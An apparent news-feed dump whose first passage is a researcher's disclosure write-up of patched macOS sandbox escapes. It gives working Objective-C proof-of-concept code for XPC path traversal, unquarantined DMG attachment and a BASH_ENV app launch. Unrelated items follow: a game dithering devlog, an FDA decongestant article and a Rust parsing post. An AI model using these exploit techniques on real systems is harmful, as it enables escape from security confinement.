    [[NSBundle bundleWithPath:@"/System/Library/Frameworks/Intents.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.intents.intents-helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(INHServing)];
    [conn setInterruptionHandler:^{
        NSLog(@"connection interrupted!");
    }];
    [conn setInvalidationHandler:^{
        NSLog(@"connection invalidated!");
    }];
    [conn resume];

    [[conn remoteObjectProxy] purgeImageWithIdentifier:[@"../../../../.." stringByAppendingPathComponent:target] completion:^(NSError *error) {
        NSLog(@"error:%@", error);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/X0fv3x6bmF8</p>

<h3 id="the-patch-5">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the input string from the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154748729.png" alt="image-20241020154748729"></p>

<p>The special characters used for path traversal will be trimmed.</p>

<h2 id="cve-2024-27864">CVE-2024-27864</h2>

<p>The CVE entry is waiting to be published.</p>

<h3 id="the-issue-7">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/DiskImages2.framework/XPCServices/diskimagescontroller.xpc
</code></pre></div>

<p>This XPC service is powerful because it has the special entitlement “<strong>com.apple.diskimages.creator-uc</strong>” in its code signature:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155146714.png" alt="image-20241020155146714"></p>

<p>This entitlement has two main functions:</p>

<ul>
  <li>Talk to <code>/usr/libexec/diskimagesiod</code>, which has the <strong>FDA</strong> entitlement and does the real attach job.</li>
  <li>Connect to the IOKit Service “<strong>AppleDiskImagesController</strong>” (<code>/System/Library/Extensions/AppleDiskImages2.kext</code>), which <strong>creates</strong> and <strong>quarantines</strong> a device for a DMG file.</li>
</ul>

<p>Similarly, the XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155625758.png" alt="image-20241020155625758"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155632557.png" alt="image-20241020155632557"></p>

<p>The <code>DIControllerProtocol</code> has 10 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155720932.png" alt="image-20241020155720932"></p>

<p>The first issue exists in the XPC method named “<code>attachWithParams:reply:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155804040.png" alt="image-20241020155804040"></p>

<p>At line 12, it calls the function “<code>checkAttachEntitlementWithError</code>”. As the name implies, the checker function should check the entitlement of the incoming XPC client. However, it always returns <strong>TRUE</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155850857.png" alt="image-20241020155850857"></p>

<p>The XPC client has already been implemented in the <code>DiskImages2.framework</code> as the objective-c class <strong>DIAttachParams</strong>. And the XPC connection can be established via the method “<code>-[DIAttachParams newAttachWithError:]</code>”. So I could reuse the framework code directly like this to attach a DMG volume without reinventing the wheels:</p>

<div><pre><code>NSError *error=nil;
DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"quarantined_payload.dmg"] error:&amp;error];
[params newAttachWithError:&amp;error];
</code></pre></div>

<p>However, I discovered that the <strong>client code</strong> in the framework will <strong>check</strong> whether the input URL is quarantined:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020160238432.png" alt="image-20241020160238432"></p>

<p>If the input URL is quarantined, it will set the <strong>quarantine parameter</strong> before invoking the XPC method to attach. This will notify the XPC service to quarantine the target device.</p>

<p>So in my own XPC client, I can <strong>skip the quarantine parameter setting</strong> and invoke the XPC method to attach directly. As a result, the XPC service will <strong>attach a quarantined DMG file without quarantining the corresponding device</strong>.</p>

<h3 id="the-exploit-and-demo-7">The exploit and demo</h3>

<p>In order to skip setting the quarantine parameter, I have to <strong>rewrite the XPC client code</strong> by myself:</p>

<div><pre><code>@protocol DIControllerProtocol
- (void)dupWithStderrHandle:(NSFileHandle *)arg1 reply:(void (^)(NSError *))arg2;
- (void)attachWithParams:(DIAttachParams *)arg1 reply:(void (^)(NSError *))reply;
@end
@interface DIController2Client : NSObject&lt;DIController2ClientProtocol&gt;
@end
@implementation DIController2Client
- (void)attachCompletedWithHandle:(NSFileHandle *)handle reply:(void (^)(NSError *))reply {
    NSLog(@"attachCompletedWithHandle:%@", handle);
    system("open /Volumes/.exploit/poc.app"); // launch the app from the payload.dmg (unquarantined mounting)
    reply(0);
}
@end
void exploit_diskimages2(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/DiskImages2.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.diskimagescontroller"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIControllerProtocol)];
    conn.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIController2ClientProtocol)];
    conn.exportedObject = [[DIController2Client alloc]init];
    [conn resume];
    id proxy = [conn remoteObjectProxy];
    
    // [proxy dupWithStderrHandle:[NSFileHandle fileHandleWithStandardError] reply:^(NSError *err) {}];
    DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"payload.dmg"] error:nil];
    [proxy attachWithParams:params reply:^(NSError *err) { // the quarantined payload.dmg (dropped by this sandboxed app) will be attached without being quarantined!
        NSLog(@"attach error:%@", err);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/FYcFwkgiGzw</p>

<h3 id="the-patch-6">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.4 by <strong>moving the verification logic from the client side to the server side</strong>.</p>

<p>It will quarantine the corresponding device directly from the server, if the input file path is quarantined.</p>

<h2 id="cve-2023-42977">CVE-2023-42977</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173015038.png" alt="image-20241019173015038"></p>

<h3 id="the-issue-8">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/PowerlogCore.framework/XPCServices/PerfPowerServicesSignpostReader.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162727212.png" alt="image-20241020162727212"></p>

<p>The <code>XPCSignpostReaderProtocol</code> has 6 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162915916.png" alt="image-20241020162915916"></p>

<p>However, Apple has only implemented one XPC method named “<code>submitSignpostDataWithConfig:withReply:</code>”, the other 5 XPC methods are empty implementations.</p>

<p>The core logic of this XPC method is to collect the log data and archive it to a gzip file. It seems that the log archive data will later be submitted to the Apple servers. However, there is a path traversal issue in this XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163019774.png" alt="image-20241020163019774"></p>

<p>Because the variable “<code>tagUUID</code>” is an arbitrary string, that can be controlled by the XPC client. The “<code>powerlog</code>” path can be hijacked to an arbitrary path.</p>

<h3 id="the-exploit-and-demo-8">The exploit and demo</h3>

<h4 id="the-exploit-1-arbitrary-path-delete">The Exploit 1: Arbitrary Path Delete</h4>

<p>At line 160 of the function:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163201932.png" alt="image-20241020163201932"></p>

<p>It calls the method named “<code>archiveDirectoryAt:deleteOriginal:</code>” which will delete the “<code>powerlog</code>” path. So this gives the attacker a primitive to remove an arbitrary path:</p>

<div><pre><code>    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @"taskingAllowlist":@{},
        @"taskingStartDate":[NSDate now],
        @"taskingEndDate":[NSDate now],
        @"taskingSubmitSP":@0,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@", path]
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
</code></pre></div>

<h4 id="the-exploit-2-arbitrary-directory-create-and-full-sandbox-esacpe">The Exploit 2: Arbitrary Directory Create and Full Sandbox Esacpe</h4>

<p>Moreover, at line 41 of the function “<code>createSignpostFile:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163334261.png" alt="image-20241020163334261"></p>

<p>It creates the directory at the “<code>powerlog</code>” path. So this gives the attacker a primitive to create an arbitrary directory:</p>

<div><pre><code>@protocol XPCSignpostReaderProtocol &lt;NSObject&gt;
- (void) submitSignpostDataWithConfig:(id)config withReply:(void (^)(id))arg2;
@end
void my_create_path(NSString *path) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/PowerlogCore.framework"]load];
    conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.PerfPowerServicesSignpostReader"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCSignpostReaderProtocol)];
    [conn resume];
    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @“taskingAllowlist":@{}, @"taskingStartDate":[NSDate now], @"taskingEndDate":[NSDate now], @“taskingSubmitSP":@1,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@/logarchive", path],
            …
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
}
</code></pre></div>

<p>In fact, <strong>the primitive to create an arbitrary directory without the quarantine extended attribute can lead to a full sandbox escape</strong>.</p>

<p>Here, I used the trick from <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>:</p>

<div><pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *currentDir = NSHomeDirectory();
    NSString *payloadPath = [currentDir stringByAppendingPathComponent:@"payload"];
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:payloadPath atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
    NSString *myapp = [currentDir stringByAppendingPathComponent:@"poc.app"];
    my_create_path(myapp); // create .app folder without being quarantined
    
    mkdir("poc.app/Contents", 0777);
    mkdir("poc.app/Contents/MacOS", 0777);
    symlink("/bin/bash", "poc.app/Contents/MacOS/poc");
    NSString *cmd = [NSString stringWithFormat:@"defaults write \"%@/poc.app/Contents/Info\" LSEnvironment -dict-add BASH_ENV \"%@\"", currentDir, payloadPath];
    system([cmd UTF8String]);
    system("open ./poc.app");
}
</code></pre></div>

<p>Demo link: https://youtu.be/6R4tfOGAjm0</p>

<h3 id="the-patch-7">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by <strong>sanitizing the UUID string</strong> from the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164330021.png" alt="image-20241020164330021"></p>

<p>If the input string is not a <strong>valid UUID</strong>, then it will exit the function.</p>

<h2 id="take-away">Take Away</h2>

<h3 id="summary">Summary</h3>

<ul>
  <li>
    <p>An overlooked attack surface</p>
  </li>
  <li>
    <ul>
      <li>System (private) frameworks’ XPC services (<strong>PID Domain</strong>)</li>
    </ul>
  </li>
  <li>
    <p>Drop a file/folder without being quarantined == Full Sandbox Escape</p>
  </li>
  <li>
    <ul>
      <li>File quarantine attribute lost during decompression == <strong>Gatekeeper Bypass</strong> == <strong>Sandbox Escape</strong>. E.g., <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a></li>
    </ul>
  </li>
  <li>
    <p>A few sandbox escape vulnerabilities and the exploits</p>
  </li>
  <li>
    <ul>
      <li>
        <p>And more?</p>
      </li>
      <li>
        <ul>
          <li>There are 5 reports still in the patching queue</li>
          <li>Find your own sandbox escape vulnerabilities :P</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="one-more-thing">One More Thing</h3>

<p>I submitted this report to Apple:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164839630.png" alt="image-20241020164839630"></p>

<p>Apple deemed it an expected behavior and closed the report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164854324.png" alt="image-20241020164854324"></p>

<p>I can understand why Apple thinks this is an expected behavior. Because the newly launched application is not in the context of the current process and it cannot share entitlements or privileges that the current process may have.</p>

<h3 id="my-thoughts">My thoughts</h3>

<ul>
  <li>The <strong>App Sandbox</strong>: dropped files are quarantined <strong>by default</strong>.</li>
  <li>The <strong>Service Sandbox</strong>: dropped files are <strong>not quarantined by default.</strong></li>
  <li>
    <ul>
      <li>
        <ul>
          <li>Not a flaw: The newly launched process is <strong>not in the current service execution context</strong>, and thus can’t share the entitlements/privileges of the current service.</li>
          <li>It’s a flaw: Once an attacker get the remote code execution (RCE) in a sandbox-restricted service context (e.g., <strong>IMTranscoderAgent, 0-click exploited by NSO Group</strong>), he can drop and launch a new non-sandboxed application to get rid of the sandbox restriction of the target service (<strong>IMTranscoderAgent</strong>).</li>
          <li>e.g., “<code>com.apple.WebDriver.HTTPService.xpc</code>” calls the API “<strong>WBSEnableSandboxStyleFileQuarantine</strong>” manually.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Escape from the <strong>App Sandbox</strong> to the <strong>Service Sandbox</strong> == <strong>Non Sandbox</strong> (<strong>macOS Only</strong>)</li>
</ul>

<h3 id="resources">Resources</h3>

<p>Here is a list of resources for reference:</p>

<ul>
  <li>https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</li>
  <li>https://saelo.github.io/presentations/bits_of_launchd.pdf</li>
  <li>https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html</li>
  <li>https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</li>
  <li>https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf</li>
  <li>https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html</li>
  <li>https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper</li>
  <li>https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/</li>
</ul>


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Stabilizing the Obra Dinn 1-bit dithering process (2017) (310 pts)]]></title>
            <link>https://forums.tigsource.com/index.php?topic=40832.msg1363742#msg1363742</link>
            <guid>42084080</guid>
            <pubDate>Fri, 08 Nov 2024 04:15:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forums.tigsource.com/index.php?topic=40832.msg1363742#msg1363742">https://forums.tigsource.com/index.php?topic=40832.msg1363742#msg1363742</a>, See on <a href="https://news.ycombinator.com/item?id=42084080">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><b><span size="5">Fullscreen, Round 3</span></b></p><p>Thanks everybody for all the suggestions. I tried everything, literally, and concluded that the best way to maintain the game's style and fix the fullscreen discomfort was to stabilize the swimming dither and subdue the flickering dots. I got there in the end, with a few compromises. This is the 3rd full devlog post I've written on this. For each previous version I'd get an idea or find something else to try while checking over it. At this point, don't even care.</p><p><span size="5"><b>Dithering Process</b></span></p><p>First, a quick explanation. Obra Dinn renders everything internally in 8-bit grayscale then converts the final output to 1-bit in a post-processing pass. The conversion from 8-bit to 1-bit is handled by comparing each source image's pixel to the corresponding dot in a tiling dither pattern. If the image pixel value&nbsp;is greater than the dither pattern dot value, the output bit is set to 1. Otherwise it's 0. The output gets reduced to 1-bit and the viewer's eye will merge the pixels back together to approximate more bits.</p><p><img src="http://3909.co/dev/od/img/Dither2-Exp.png" alt=""></p><p>Thresholding a source image by a dither pattern</p><p>The two components of this process are the source image and the dither pattern. Obra Dinn uses two distinct patterns for different cases: an 8x8 bayer matrix for a smoother range of shades,&nbsp;and a 128x128 blue noise field for a less ordered output.</p><p><img src="http://3909.co/dev/od/img/Dither2-ExpPatterns.png" alt=""></p><p>bayer / blue noise</p><p><img src="http://3909.co/dev/od/img/Dither2-Exp2.png" alt=""></p><p>In-engine result without wireframe lines. Bayer on the sphere, blue noise everywhere else.</p><p><b><span size="5">Hold Still Please</span></b></p><p>The basic dithering process works great for static images and much less great for moving or animated images. When&nbsp;the source image changes from frame-to-frame&nbsp;the static dither pattern and low resolution output&nbsp;become a major problem.&nbsp;What should be solid shapes and shades now read as a wiggling mess of pixels.</p><p><img src="http://3909.co/dev/od/img/Dither2-ExpMoving.gif" alt=""></p><p>Moving the sphere</p><p>These days,&nbsp;dithering is mostly used when the source image is either static or the output has a&nbsp;high resolution. The first thought when seeing this low-res swimming dither effect is not "yeah that's how dither works" but "what is this warping shaking effect and how can I turn it off."</p><p><img src="http://3909.co/dev/od/img/Dither2-Original.gif" alt=""></p><p>Exhibit A. Reduced contrast for your comfort.</p><p>Try to focus on something here when it moves and behold&nbsp;the&nbsp;crinkled&nbsp;heart of Obra Dinn's fullscreen problems. There are ways to fix this that mostly&nbsp;boiling down to "this style doesn't work, change it." I went pretty far down that path, experimenting with different styles, before swinging back and wondering if maybe I shouldn't let these bullshit little pixels push me around.</p><p><b><span size="5">Stabilizing The Dither</span></b></p><p>To give&nbsp;your eyes the best chance at recombining everything, dithering works best when the dither pattern&nbsp;dots have a 1:1 correlation with the output pixels. But, correlating&nbsp;only&nbsp;with the output means that as a scene post effect there's no connection&nbsp;between the geometry being rendered and the pattern that thresholds it. Each frame, moving scene elements threshold against different values. What I want instead is for the dither pattern to be "pinned" to the geometry and to appear stable as it moves with the rest of the scene.</p><p>The core of this is a mapping problem. As told&nbsp;by the length of this post, there's a conflict between the&nbsp;ideal&nbsp;dither pattern mapping (1:1 with the screen) and the&nbsp;ideal scene mapping (x:1 with the geometry) so get ready for some compromises.&nbsp;Most of my work was focused on mapping the input&nbsp;dither pattern into different spaces&nbsp;that better correlate the pattern with the scene geometry. Everything here is done at the pre-thresholding stage.</p><p><span size="5">Texel Space</span></p><p>My first try was to map the dither pattern in texel space. This is equivalent to dithering the object textures during scene rendering instead of in a post-processing pass on the 8-bit output. I didn't expect this to work well but wanted to see what a perfectly scene-matched mapping looked like anyways.</p><p><img src="http://3909.co/dev/od/img/Dither2-TexelMap.png" alt=""></p><p>Dither pattern in texel space</p><p>Ok well, expectations solidly met. The objects are all mapped differently so their pattern scales don't match. Those could be unified. The real problem is the aliasing. Any resampling&nbsp;from one space to another like this will result in aliasing, and dither patterns can't be easily mipped&nbsp;or filtered like traditional textures. Still, to carry it through:</p><p><img src="http://3909.co/dev/od/img/Stable-Texel.gif" alt=""></p><p>Applied to the moving scene</p><p>This isn't a total loss - the&nbsp;pattern is nicely pinned to geometry. The aliasing produces its own swimming effect and unifying or scaling the mappings won't help with that.&nbsp;Texels&nbsp;change size with distance from the camera so there will always be&nbsp;dither pattern pixels that alias badly when resampled to the screen.</p><p><span size="5">Motion Warping</span></p><p>If I want the dither pattern to track the moving geometry beneath it, why not just warp the pattern using the change in position of each rendered pixel in the scene? Indeed why not. This is a bit like a motion blur, where each pixel tracks its movement from the previous frame. In this case, I update the dither texture to keep its pattern moving with the scene. If a scene pixel was not represented in the previous frame, the dither pattern is reloaded&nbsp;there. This&nbsp;technique is made much simpler by the game's static-ness - I only need to worry about the movement of the camera, not individual objects.</p><p><img src="http://3909.co/dev/od/img/Stable-Warp.gif" alt=""></p><p>Warping the dither pattern to maintain frame-to-frame coherence with&nbsp;the scene</p><p>This was a pretty quick &amp; dirty try but a few things are clear. First, it kinda works. Second, a dither pattern needs a neighborhood - it can't be individual pixels. If you consider each pixel individually, as this method does, then you'll get breaks and discontinuities in the pattern which are obvious. I shifted the camera in this test scene to highlight those on the chest here. Viewing the warped dither pattern itself&nbsp;makes this a little easier to see.</p><p><img src="http://3909.co/dev/od/img/Stable-WarpMapping.gif" alt=""></p><p>Thresholding solid gray with the warping dither pattern</p><p>These discontinuities are down to the differing pixel depths and&nbsp;thresholds that I chose. I reasoned an elaborate fix based on tracking regions, averaging their depth and shifting all dither pattern dots in that region by the same amount. A discontinuity along a region boundary could be hidden by sharp lighting changes or a wireframe line.&nbsp;This would've been enabled by the game's existing setup of colored regions for the wireframe generation. When I sat down to implement all that, the depth term dropped out of the first&nbsp;equation I came up with and gave me a much simpler alternative:</p><p><span size="5">Screen-mapping&nbsp;With Offset</span></p><p>When putting together the equations for the warping dither, a very simple transform fell out:</p><p>DitherOffset =&nbsp;ScreenSize * CameraRotation / CameraFov<br></p><p><img src="http://3909.co/dev/od/img/Dither2-ShiftingExp.gif" alt=""></p><p>Shifting the screen-mapped dither pattern based on camera rotation</p><p>Basically, this expresses that I want the screen-mapped dither pattern to shift by exactly one screen&nbsp;when the camera rotates through one field of view. That maintains a 1:1 mapping with the screen while also considering a simplified transform of the scene geometry in view. This really only matches the movement at the center of the screen but bless this fucked up world because it's nearly good enough.</p><p><img src="http://3909.co/dev/od/img/Dither2-Shifting.gif" alt=""></p><p>Offsetting the dither pattern to track one screen per camera fov rotation</p><p>Note how the dithered pixels on the chair appear to mostly move with the geometry. Likewise for the sphere. Planes more perpendicular to the view don't match very well;&nbsp;the floor is still a mess.</p><p>So while not being perfect, simply shifting the screen-mapped dither keeps&nbsp;the overall pattern and scene&nbsp;movement close enough that the eyes can better track them together. I was pretty happy with this. While cleaning up the code and committing everything, maybe writing a devlog post or two, the idea of a&nbsp;perfectly-pinned dither kept nagging at me:</p><p><span size="5">World&nbsp;Space - Cube Mapping</span></p><p>The experiments so far suggest&nbsp;that&nbsp;any&nbsp;correlation between the dither pattern and scene geometry would have to ignore depth information from the scene. What this means practically is that the dither can be pinned to the geometry during camera rotation but not during camera translation. This isn't such a bad thing for Obra Dinn considering the slow pace of the game and the observational&nbsp;role of the player. You're normally walking around, stopping, and looking at things. When walking, so many things are changing onscreen that the swimming&nbsp;dither isn't as obvious.</p><p>With that in mind, my next attempt was&nbsp;mapping the dither pattern to the geometry indirectly by pre-rendering it onto the sides of a cube centered around the camera. The cube translates with the camera but stays oriented to the world. In the mix: little bit of screen, little bit of scene.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCube.png" alt="" width="400" height="296"></p><p>Dither pattern mapped to a cube centered around the camera</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCubeMap.png" alt=""></p><p>Camera's view looking up into a corner. Mapping scaled up for clarity.</p><p>The cube's mapping works well when looking directly into the sides, and not so well when aimed into a corner. Still, the dither pattern stays perfectly fixed in 3D space as the camera rotates.&nbsp;Even rough,&nbsp;the result is&nbsp;promising.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCube.gif" alt=""></p><p>Thresholding scene&nbsp;with the cube-mapped dither pattern</p><p>Now we're talking. Being a post-processing pass makes this more general than texel-space mapping, which is good. The problem is now down to the particular cube mapping. An ideal mapping would have&nbsp;one texel on the cube always resolve to exactly one pixel on the screen, regardless of the camera rotation. That's not possible with a cube...</p><p><span size="5">World&nbsp;Space - Sphere Mapping</span></p><p>...but&nbsp;I got pretty close with a sphere.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphereMap.png" alt=""></p><p>Mapping the dither pattern onto the inside of a sphere</p><p>Finding this particular spherical mapping took some time. There's no way to perfectly tile a square texture onto a sphere. It would've been possible to redefine the dither matrices in terms of a hexagon grid or something else that does tile on a sphere. Possible&nbsp;maybe, I didn't try. Instead, I just hacked on the square tiling&nbsp;until this carefully tweaked "rings" mapping of the original dither pattern&nbsp;gave good results.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphere.gif" alt=""></p><p>Applied to the scene</p><p>Better than the cube. Still lots of aliasing. The spherically-mapped dot size is very similar to the screen pixel size - off just enough to cause moire patterns. I could feel the closeness, and a&nbsp;very simple fix for this kind of aliasing is to supersample: apply the dither thresholding at a higher resolution and downsample.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphereMap2.png" alt=""></p><p>Spherically-mapped dither pattern at 2x and downsampled to 1x</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphere2.gif" alt=""></p><p>Thresholding at 2x, then&nbsp;downsampling to 1x</p><p>This is the best I got. There are a few compromises:</p><p>&nbsp; &nbsp; <b>1</b>&nbsp;The dither pattern dots get larger and less effective at the edges of the screen<br>&nbsp; &nbsp; <b>2</b>&nbsp;The pattern isn't aligned up-down-left-right for most camera rotations<br>&nbsp; &nbsp; <b>3</b>&nbsp;The output is no longer 1-bit due to the final box-downsample</p><p>But the upside is pretty lofty:</p><p>&nbsp; &nbsp; <b>1</b> The dithering is perfectly pinned for all camera rotations. This feels slightly uncanny in-game.<br>&nbsp; &nbsp; <b>2</b> Discomfort from swimming dither is totally gone, even at fullscreen<br>&nbsp; &nbsp; <b>3</b> The pixellated style of the game is preserved</p><p>It's possible&nbsp;eliminate compromise #3 by reducing the output back to 1-bit with a simple 50% threshold. The result is&nbsp;still better than without supersampling (the triple comparison directly below is thresholded).</p><p><img src="http://3909.co/dev/od/img/Dither2-FinalCompare.gif" alt=""></p><p>Side by side, by side</p><p><img src="http://3909.co/dev/od/img/Dither2-SplitCompare.gif" alt=""></p><p>In the game's default palette</p><p><span size="5"><b>Wrapup</b></span></p><p>It feels a little weird to put 100 hours into something that won't be noticed by its absence. Exactly no one will think, "man this dithering is stable as shit. total magic going on here." I don't want to give people problems they didn't know they should have though so it was worth fixing.</p><p>The screenspace mapping with&nbsp;offset works best at 1x and the sphere mapping&nbsp;works best at 2x.&nbsp;All scene rendering is at 800x450 now (up from 640x360), which helps legibility without sacrificing the low-res style. The final game will have&nbsp;two display modes:&nbsp;</p><p><b>DIGITAL</b><br>Border-boxed, screenspace offset dither, 1-bit output</p><p><b>ANALOG</b><br>Fullscreen, sphere-mapped dither, softened&nbsp;output</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[After decades, FDA moves to pull ineffective decongestant off shelves (298 pts)]]></title>
            <link>https://arstechnica.com/health/2024/11/fda-proposes-ditching-common-decongestant-for-being-completely-useless/</link>
            <guid>42083559</guid>
            <pubDate>Fri, 08 Nov 2024 02:37:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/health/2024/11/fda-proposes-ditching-common-decongestant-for-being-completely-useless/">https://arstechnica.com/health/2024/11/fda-proposes-ditching-common-decongestant-for-being-completely-useless/</a>, See on <a href="https://news.ycombinator.com/item?id=42083559">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                      
                      
          <p><a href="https://arstechnica.com/health/2023/09/the-spectacular-downfall-of-a-common-useless-cold-medicine/">In a long-sought move</a>, the Food and Drug Administration on Thursday formally began the process of abandoning oral doses of a common over-the-counter decongestant, which the agency concluded last year is not effective at relieving stuffy noses.</p>
<p>Specifically, the FDA issued <a href="https://dps.fda.gov/omuf/ordersearch/order_otc000036">a proposed order</a> to remove oral phenylephrine from the list of drugs that drugmakers can include in over-the-counter products—also known as the OTC monograph. Once removed, drug makers will no longer be able to include phenylephrine in products for the temporary relief nasal congestion.</p>
<p>"It is the FDA’s role to ensure that drugs are safe and effective," Patrizia Cavazzoni, director of the FDA’s Center for Drug Evaluation and Research, said in a statement. "Based on our review of available data and consistent with the advice of the advisory committee, we are taking this next step in the process to propose removing oral phenylephrine because it is not effective as a nasal decongestant."</p>
<p>For now, the order is just a proposal. The FDA will open up a public comment period, and if no comments can sway the FDA's previous conclusion that the drug is useless, the agency will make the order final. Drugmakers will get a grace period to reformulate their products.</p>
<h2>Reviewed reviews</h2>
<p>The slow-moving abandonment of phenylephrine is years in the making. The decongestant was originally approved by the FDA back in 1976, but it came to prominence after 2006. That was the year when the "Combat Methamphetamine Epidemic Act of 2005" came into effect, and pseudoephedrine—the main component of Sudafed—moved behind the pharmacy counter to keep it from being used to make methamphetamine. With pseudoephedrine out of easy reach at drugstores, phenylephrine became the leading over-the-counter decongestant. And researchers had questions.</p>
<p>In 2007, an FDA panel reevaluated the drug, which allegedly works by shrinking blood vessels in the nasal passage, opening up the airway. While the panel upheld the drug's approval, it concluded that more studies were needed for a full assessment. After that, three large, carefully designed studies were conducted—two by Merck for the treatment of seasonal allergies and one by Johnson &amp; Johnson for the treatment of the common cold. All three found no significant difference between phenylephrine and a placebo.</p>

          
                      
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why I love Rust for tokenising and parsing (262 pts)]]></title>
            <link>https://xnacly.me/posts/2024/rust-pldev/</link>
            <guid>42083547</guid>
            <pubDate>Fri, 08 Nov 2024 02:35:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xnacly.me/posts/2024/rust-pldev/">https://xnacly.me/posts/2024/rust-pldev/</a>, See on <a href="https://news.ycombinator.com/item?id=42083547">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><blockquote><p>I am currently writing a analysis tool for Sql: <a href="https://github.com/xnacly/sqleibniz"><code>sqleibniz</code></a>, specifically for the sqlite
dialect.</p><p>The goal is to perform static analysis for sql input, including: syntax
checks, checks if tables, columns and functions exist. Combining this with an
embedded sqlite runtime and the ability to assert conditions in this runtime,
